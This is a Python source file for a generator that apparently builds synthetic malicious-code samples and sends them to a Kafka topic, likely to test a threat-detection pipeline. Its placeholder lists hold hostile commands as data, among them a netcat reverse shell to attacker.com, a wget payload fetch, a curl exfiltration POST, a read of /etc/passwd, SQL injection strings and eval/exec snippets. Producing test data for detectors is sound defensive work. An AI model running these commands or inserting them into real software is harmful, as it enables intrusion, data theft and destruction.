"""
Code Sample Generator
Generates malicious code samples with various attack patterns
"""

import random
from typing import Dict, Any, Optional
from datetime import datetime

from .base_generator import BaseGenerator
from .pattern_library import MALICIOUS_CODE_PATTERNS, get_random_pattern
from loguru import logger


class CodeGenerator(BaseGenerator):
    """Generates code samples with malicious patterns"""
    
    def __init__(self, producer, rate_limit: float = 0.5, pattern: Optional[str] = None):
        """
        Initialize code generator
        
        Args:
            producer: Kafka producer instance
            rate_limit: Messages per second
            pattern: Specific pattern to use (None for random)
        """
        super().__init__(producer, rate_limit)
        self.pattern = pattern
        self.current_pattern = None
        self.logger = logger.bind(component="code_generator")
    
    def generate(self) -> Dict[str, Any]:
        """Generate a code sample"""
        # Select pattern if not set
        if not self.current_pattern:
            if self.pattern:
                self.current_pattern = self._get_pattern_by_name(self.pattern)
            else:
                self.current_pattern = random.choice(MALICIOUS_CODE_PATTERNS)
        
        pattern = self.current_pattern
        language = random.choice(pattern["languages"])
        code_template = random.choice(pattern["patterns"])
        
        # Generate code based on pattern
        code_content = self._generate_code_content(code_template, pattern, language)
        
        return {
            "source": random.choice(["github", "pastebin", "darkweb_forum", "code_repo"]),
            "code_content": code_content,
            "language": language,
            "file_name": self._generate_filename(language),
            "metadata": {
                "pattern_type": pattern["name"],
                "suspicious_keywords": pattern.get("suspicious_keywords", []),
                "autonomous_indicator": "pattern_based_behavior" if "autonomous" in pattern["name"] else None,
                "detected_at": datetime.utcnow().isoformat()
            }
        }
    
    def _generate_code_content(self, template: str, pattern: Dict[str, Any], language: str) -> str:
        """Generate actual code content from template"""
        # Replace placeholders in template
        code = template
        
        if "{command}" in code:
            commands = [
                "rm -rf /tmp/*",
                "cat /etc/passwd",
                "wget http://malicious.com/payload.sh",
                "curl -X POST http://attacker.com/data",
                "nc -e /bin/sh attacker.com 4444"
            ]
            code = code.replace("{command}", random.choice(commands))
        
        if "{code}" in code:
            malicious_code = [
                "__import__('os').system('id')",
                "eval(input())",
                "exec(compile(source, '<string>', 'exec'))",
                "subprocess.call(['/bin/sh'])"
            ]
            code = code.replace("{code}", random.choice(malicious_code))
        
        if "{url}" in code:
            urls = [
                "http://malicious.com/exfil",
                "https://attacker.net/data",
                "http://exfiltrate.tor/data"
            ]
            code = code.replace("{url}", random.choice(urls))
        
        if "{input}" in code:
            sql_injections = [
                "1' OR '1'='1",
                "'; DROP TABLE users; --",
                "1' UNION SELECT * FROM passwords--"
            ]
            code = code.replace("{input}", random.choice(sql_injections))
        
        if "{action}" in code:
            actions = [
                "exploit_target(target)",
                "scan_port(port)",
                "exfiltrate_data()",
                "self.replicate()"
            ]
            code = code.replace("{action}", random.choice(actions))
        
        if "{exploit}" in code:
            exploits = [
                "exploit_vulnerability(target)",
                "deploy_payload(target)",
                "execute_command(target, cmd)"
            ]
            code = code.replace("{exploit}", random.choice(exploits))
        
        if "{target}" in code:
            targets = ["target", "victim", "host", "server"]
            code = code.replace("{target}", random.choice(targets))
        
        # Add some context to make it more realistic
        if language == "python":
            full_code = f"""#!/usr/bin/env python3
# Suspicious code detected
{code}
"""
        elif language == "bash":
            full_code = f"""#!/bin/bash
# Automated script
{code}
"""
        elif language == "javascript":
            full_code = f"""// Suspicious JavaScript
{code}
"""
        else:
            full_code = code
        
        return full_code
    
    def _generate_filename(self, language: str) -> str:
        """Generate a filename based on language"""
        extensions = {
            "python": ".py",
            "bash": ".sh",
            "javascript": ".js",
            "sql": ".sql",
            "powershell": ".ps1"
        }
        
        ext = extensions.get(language, ".txt")
        names = [
            "suspicious",
            "payload",
            "exploit",
            "script",
            "tool",
            "helper",
            "utils"
        ]
        
        return f"{random.choice(names)}{ext}"
    
    def _get_pattern_by_name(self, name: str) -> Optional[Dict[str, Any]]:
        """Get pattern by name"""
        for pattern in MALICIOUS_CODE_PATTERNS:
            if pattern.get("name") == name:
                return pattern
        return None
    
    def _produce_data(self, data: Dict[str, Any]) -> bool:
        """Produce code sample to Kafka"""
        try:
            # Use the producer passed in constructor
            from src.models.threat import CodeSample
            
            event = CodeSample(**data)
            message = event.model_dump_json()
            
            self.producer.produce(
                "code-samples-raw",
                key=data.get("file_name", "unknown"),
                value=message
            )
            self.producer.poll(0)
            return True
        except Exception as e:
            self.logger.error(f"Error producing code sample: {e}")
            return False

